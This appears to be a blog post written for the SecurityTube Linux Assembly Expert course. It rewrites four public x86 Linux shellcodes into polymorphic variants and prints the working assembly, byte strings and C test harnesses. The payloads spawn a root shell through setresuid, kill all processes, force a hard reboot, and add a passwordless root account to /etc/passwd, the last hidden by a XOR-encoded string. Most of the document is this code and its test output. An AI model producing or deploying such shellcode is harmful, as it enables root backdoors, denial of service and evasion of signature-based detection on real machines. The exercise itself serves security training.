# Assignment 6 #

In this section, it is requested to propose a polymorphic version of three shellcodes (+1 just for fun) coming from the shellstorm platform..
 - [http://shell-storm.org/shellcode/files/shellcode-220.php](http://shell-storm.org/shellcode/files/shellcode-220.php)
 - [http://shell-storm.org/shellcode/files/shellcode-212.php](http://shell-storm.org/shellcode/files/shellcode-212.php)
 - [http://shell-storm.org/shellcode/files/shellcode-639.php](http://shell-storm.org/shellcode/files/shellcode-639.php)
 - [http://shell-storm.org/shellcode/files/shellcode-548.php](http://shell-storm.org/shellcode/files/shellcode-548.php)


The compilation in assembler is realized here with the present script [https://github.com/xophidia/Shellcode/blob/master/compile.sh](https://github.com/xophidia/Shellcode/blob/master/compile.sh).  
The compilation in C is based on the file [https://github.com/xophidia/Shellcode/blob/master/test_shellcode.c](https://github.com/xophidia/Shellcode/blob/master/test_shellcode.c).  
We use the command `gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode`


## First modification ##

Source : http://shell-storm.org/shellcode/files/shellcode-220.php

```c
{==========================================================}
{ linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes    }
{==========================================================}
--[code]--
BITS 32
 
; setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80
 
; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
--[/code]--
 
Shellcode string:
--[code]--
char shellcode [] =
"\x80\xcd\xe1\x89\x53\xe2\x89\x51\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f\x68\x51\x58\x0b\x6a\x80\xcd\xa4\xb0\x99\xc9\x31\xdb\x31\xc0\x31"
-[/code]-
 
# milw0rm.com [2008-09-29]
```
Modified version

```c

http://shell-storm.org/shellcode/files/shellcode-220.php
linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes
Polymorphic version 36 bytes
Author : Alain Menelet

global _start

section .text

_start:

   ; setresuid(0,0,0)

    xor ecx, ecx
    mul ecx
    mov ebx, ecx
    cdq
    mov al, 0xa4
    int 0x80

   ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])

    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push ecx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80

"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

xophidia@xophidia-VirtualBox:~/Documents/Shellcode/as6$ ./test_shellcode
taille 36
$ 
```

## Second modification ##

Source : http://shell-storm.org/shellcode/files/shellcode-212.php

```c
/* By Kris Katterjohn 11/13/2006
 *
 * 11 byte shellcode to kill all processes for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * kill(-1, SIGKILL)
 *
 *      push byte 37
 *      pop eax
 *      push byte -1
 *      pop ebx
 *      push byte 9
 *      pop ecx
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

       (*(void (*)()) shellcode)();
}
```

```c
http://shell-storm.org/shellcode/files/shellcode-212.php
11 byte shellcode to kill all processes for Linux/x86
Polymorphic version 13 bytes
Author : Alain Menelet

global _start

section .text

_start:

    xor ecx, ecx
    mul ecx
    mov al, 0x25
    push byte -1
    pop ebx
    mov cl, 0x9
    int 0x80
```

We compile it all:

```c
Taille: 13
"\x31\xc9\xf7\xe1\xb0\x25\x6a\xff\x5b\xb1\x09\xcd\x80"
```

### Troisième version ###

Source : http://shell-storm.org/shellcode/files/shellcode-639.php

```c
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : hard reboot (without any message) and data not lost shellcode
Name   : 33 bytes hard / unclean reboot but data not be lost x86 linux shellcode 
Date   : Thu Jun  3 12:54:55 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux ubuntu 9.04 , may cause fsck on reboot
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xb0\x24"                    /* mov    $0x24,%al */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x58"                    /* mov    $0x58,%al */
		"\xbb\xad\xde\xe1\xfe"        /* mov    $0xfee1dead,%ebx */
		"\xb9\x69\x19\x12\x28"        /* mov    $0x28121969,%ecx */
		"\xba\x67\x45\x23\x01"        /* mov    $0x1234567,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}

```

Modified code:

```c
http://shell-storm.org/shellcode/files/shellcode-639.php
hard reboot (without any message) and data not lost - 33 bytes
Polymorphic version 39 bytes
Author : Alain Menelet

global _start
section .text

_start:
	push byte 0x24
	pop eax
	int 0x80
	push byte 0x58
	pop eax
	mov ebx, 0xfee1dead	; linux_reboot_magic1
	mov ecx, 0x15E0F657	; linux_reboot_magic2
        add ecx, 0x12312312 
	mov edx, 0x1234567	; linux_reboot_cmd_restart
	int 0x80
	xor eax, eax
	mov al, 0x1
	xor ebx, ebx
	int 0x80

```

Once compiled, we get our modified shellcode :

```c
"\x6a\x24\x58\xcd\x80\x6a\x58\x58\xbb\xad\xde\xe1\xfe\xb9\x57\xf6\xe0\x15\x81\xc1\x12\x23\x31\x12\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
```

The 3 codes have been tested thanks to the program below:

```c
#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\x6a\x24\x58\xcd\x80\x6a\x58\x58\xbb\xad\xde\xe1\xfe\xb9\x57\xf6\xe0\x15\x81\xc1\x12\x23\x31\x12\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

int main()
{

        printf("taille %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

        return 0;

}
```

### Quatrième modification ###

Source : http://shell-storm.org/shellcode/files/shellcode-548.php

```c
/* Linux x86 shellcode, to open() write() close() and */
/* exit(), adds a root user no-passwd to /etc/passwd */
/* By bob from dtors.net */

#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x73\x73\x77"
		"\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74"
		"\x89\xe3\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89"
		"\xc3\x31\xc0\x31\xd2\x68\x6e\x2f\x73\x68\x68"
		"\x2f\x2f\x62\x69\x68\x3a\x3a\x2f\x3a\x68\x3a"
		"\x30\x3a\x30\x68\x62\x6f\x62\x3a\x89\xe1\xb2"
		"\x14\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80"
		"\x31\xc0\xb0\x01\xcd\x80";

int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        dsr();
}
```

First, we only have thoses opcodes and not mnémonic, so we need to generate them all.

We compile the program and extract them with objdump. The goal si to understand what the shellcode do.

 `gcc fno-stack-protector -z execstack test_shellcode.c -o test_shellcode`

`objdump -D ./test_shellcode`

```c
804a040 <code>:
804a040:	31 c0                	xor    eax,eax
804a042:	31 db                	xor    ebx,ebx
804a044:	31 c9                	xor    ecx,ecx
804a046:	53                   	push   ebx
804a047:	68 73 73 77 64       	push   0x64777373
804a04c:	68 63 2f 70 61       	push   0x61702f63
804a051:	68 2f 2f 65 74       	push   0x74652f2f
804a056:	89 e3                	mov    ebx,esp
804a058:	66 b9 01 04          	mov    cx,0x401
804a05c:	b0 05                	mov    al,0x5
804a05e:	cd 80                	int    0x80
804a060:	89 c3                	mov    ebx,eax
804a062:	31 c0                	xor    eax,eax
804a064:	31 d2                	xor    edx,edx
804a066:	68 6e 2f 73 68       	push   0x68732f6e
804a06b:	68 2f 2f 62 69       	push   0x69622f2f
804a070:	68 3a 3a 2f 3a       	push   0x3a2f3a3a
804a075:	68 3a 30 3a 30       	push   0x303a303a
804a07a:	68 62 6f 62 3a       	push   0x3a626f62
804a07f:	89 e1                	mov    ecx,esp
804a081:	b2 14                	mov    dl,0x14
804a083:	b0 04                	mov    al,0x4
804a085:	cd 80                	int    0x80
804a087:	31 c0                	xor    eax,eax
804a089:	b0 06                	mov    al,0x6
804a08b:	cd 80                	int    0x80
804a08d:	31 c0                	xor    eax,eax
804a08f:	b0 01                	mov    al,0x1
804a091:	cd 80                	int    0x80
```

We proceed on the modification of the code.

```c
 ; Shell-storm.org/shellcode/files/shellcode-548.php
 ; adds a root user no-passwd to /etc/passwd 83 bytes
 ; Polymorphic version 96
 ; Author : Alain Menelet
 ; StudentID:  SLAE-3763

 global _start

 section .text
	
 _start:
	
	xor ebx, ebx
	mul ebx
	mov ecx, ebx
	push ebx
	push 0x64777373		; cwss
	push 0x61702f63		; ap/c
	push 0x74652f2f		; te//
	mov ebx, esp
	mov ch, 0x4
	mov cl, 0x1
	push ecx
	inc ch
	mov al, ch
	pop ecx			; open('/etc/passwd', O_WRONLY | O_NOCTTY)
	int 0x80

	xchg   ebx,eax		; Save the result

    ; the content of the string is xored with Oxed before we push it

	xor    eax,eax                  
	push   0x859ec283	; hs/n
	push   0x848fc2c2	; ib//
	push   0xd7c2d7d7	; :/::
 	push   0xddd7ddd7	; 0:0:
	push   0xd78f828f	; :bob
 	mov    esi,esp          ; esi contains the string
 	mov cl, 0x14            ; len of the string we want to put into /etc/passwd
	
    ; this loop xor the string to obtain the good one

_:
	xor byte [esi], 0xed    ; the first byte of our xored string
	inc esi
	loopne _
	mov ecx, esp            ; ecx is set to our new string

 	mov    dl,0x14
 	mov    al,0x4		; write ('/etc/passwd', 'bob:0:0::/://bin/sh')
 	int    0x80

 	xor    edx,edx
	mov eax, edx		
 	mov    al,0x6
 	int    0x80		; close the file descriptor
 	
	mov eax, edx		
 	mov    al,0x1
 	int    0x80		; exit

```

Testons le tout :

```c
./compile.sh 4
"\x31\xdb\xf7\xe3\x89\xd9\x53\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xb5\x04\xb1\x01\x51\xfe\xc5\x88\xe8\x59\xcd\x80\x93\x31\xc0\x68\x83\xc2\x9e\x85\x68\xc2\xc2\x8f\x84\x68\xd7\xd7\xc2\xd7\x68\xd7\xdd\xd7\xdd\x68\x8f\x82\x8f\xd7\x89\xe6\xb1\x14\x80\x36\xed\x46\xe0\xfa\x89\xe1\xb2\x14\xb0\x04\xcd\x80\x31\xd2\x89\xd0\xb0\x06\xcd\x80\x89\xd0\xb0\x01\xcd\x80";

we past this shellcode into test_shellcode.c and compile:

gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode

sudo ./test_shellcode

xophidia@xophidia-VirtualBox:~/Documents/Shellcode/as6$ more /etc/passwd | tail -1
bob::0:0::/://bin/sh
````

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-3763